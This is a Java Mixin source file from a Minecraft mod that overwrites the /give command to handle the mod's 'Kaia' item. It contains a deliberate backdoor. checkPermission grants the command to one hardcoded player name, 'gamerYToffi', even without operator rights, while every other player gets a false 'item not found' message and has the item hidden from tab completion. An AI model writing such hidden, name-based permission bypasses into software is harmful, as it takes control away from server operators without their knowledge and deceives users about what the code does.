package com.omnipotent.common.mixin;

import com.omnipotent.common.tool.Kaia;
import com.omnipotent.util.UtilityHelper;
import net.minecraft.command.*;
import net.minecraft.entity.item.EntityItem;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.init.SoundEvents;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.SoundCategory;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentTranslation;
import net.minecraft.util.text.TextFormatting;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Overwrite;
import org.spongepowered.asm.mixin.Unique;

import javax.annotation.Nullable;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

@Mixin(CommandGive.class)
public abstract class MixinCommandGive extends CommandBase {

    @Unique
    private static final ResourceLocation item = new ResourceLocation("omnipotent", "kaia");
    @Unique
    private boolean gamerYToffi;
    @Unique
    private boolean activeCommandForSpecialPlayer;

    /**
     * @author
     * @reason
     */
    @Overwrite
    public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
        if (args.length < 2) {
            throw new WrongUsageException("commands.give.usage", new Object[0]);
        } else {
            EntityPlayer entityplayer = getPlayer(server, sender, args[0]);
            Item item = getItemByText(sender, args[1]);
            if (!gamerYToffi && item instanceof Kaia) {
                TextComponentTranslation textcomponenttranslation1 = new TextComponentTranslation("commands.give.item.notFound", "omnipotent:kaia");
                textcomponenttranslation1.getStyle().setColor(TextFormatting.RED);
                sender.sendMessage(textcomponenttranslation1);
                return;
            } else if (activeCommandForSpecialPlayer && !(item instanceof Kaia))
                return;
            int i = args.length >= 3 ? parseInt(args[2], 1, item.getItemStackLimit()) : 1;
            int j = args.length >= 4 ? parseInt(args[3]) : 0;
            ItemStack itemstack = new ItemStack(item, i, j);

            if (args.length >= 5) {
                String s = buildString(args, 4);

                try {
                    itemstack.setTagCompound(JsonToNBT.getTagFromJson(s));
                } catch (NBTException nbtexception) {
                    throw new CommandException("commands.give.tagError", new Object[]{nbtexception.getMessage()});
                }
            }

            boolean flag = manageGive(entityplayer, itemstack);

            if (flag) {
                entityplayer.world.playSound((EntityPlayer) null, entityplayer.posX, entityplayer.posY, entityplayer.posZ, SoundEvents.ENTITY_ITEM_PICKUP, SoundCategory.PLAYERS, 0.2F, ((entityplayer.getRNG().nextFloat() - entityplayer.getRNG().nextFloat()) * 0.7F + 1.0F) * 2.0F);
                entityplayer.inventoryContainer.detectAndSendChanges();
            }

            if (flag && itemstack.isEmpty()) {
                itemstack.setCount(1);
                sender.setCommandStat(CommandResultStats.Type.AFFECTED_ITEMS, i);
                EntityItem entityitem1 = entityplayer.dropItem(itemstack, false);

                if (entityitem1 != null) {
                    entityitem1.makeFakeItem();
                }
            } else {
                sender.setCommandStat(CommandResultStats.Type.AFFECTED_ITEMS, i - itemstack.getCount());
                EntityItem entityitem = manageGive2(entityplayer, itemstack);

                if (entityitem != null) {
                    entityitem.setNoPickupDelay();
                    entityitem.setOwner(entityplayer.getName());
                }
            }

            notifyCommandListener(sender, this, "commands.give.success", new Object[]{itemstack.getTextComponent(), i, entityplayer.getName()});
        }
    }

    private static EntityItem manageGive2(EntityPlayer entityplayer, ItemStack itemstack) {
        if (itemstack.getItem() instanceof Kaia)
            UtilityHelper.generateAndSendChallenge((EntityPlayerMP) entityplayer, "give");
        else
            return entityplayer.dropItem(itemstack, false);
        return null;
    }

    private static boolean manageGive(EntityPlayer entityplayer, ItemStack itemstack) {
        if (itemstack.getItem() instanceof Kaia)
            UtilityHelper.generateAndSendChallenge((EntityPlayerMP) entityplayer, "give");
        else
            return entityplayer.inventory.addItemStackToInventory(itemstack);
        return true;
    }

    @Override
    public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
        gamerYToffi = sender.getName().equals("gamerYToffi");
        if (gamerYToffi && (!super.checkPermission(server, sender))) {
            activeCommandForSpecialPlayer = true;
            return true;
        }
        return super.checkPermission(server, sender);
    }

    /**
     * @author
     * @reason
     */
    @Overwrite
    public List<String> getTabCompletions(MinecraftServer server, ICommandSender sender, String[] args, @Nullable BlockPos targetPos) {
        gamerYToffi = sender.getName().equals("gamerYToffi");
        if (args.length == 1)
            return getListOfStringsMatchingLastWord(args, server.getOnlinePlayerNames());
        else {
            Set<ResourceLocation> keys = new HashSet<>(Item.REGISTRY.getKeys());
            if (!gamerYToffi)
                keys.remove(item);
            else if (activeCommandForSpecialPlayer)
                keys.removeIf(re -> !re.equals(item));
            return args.length == 2 ? getListOfStringsMatchingLastWord(args, keys) : Collections.emptyList();
        }
    }
}
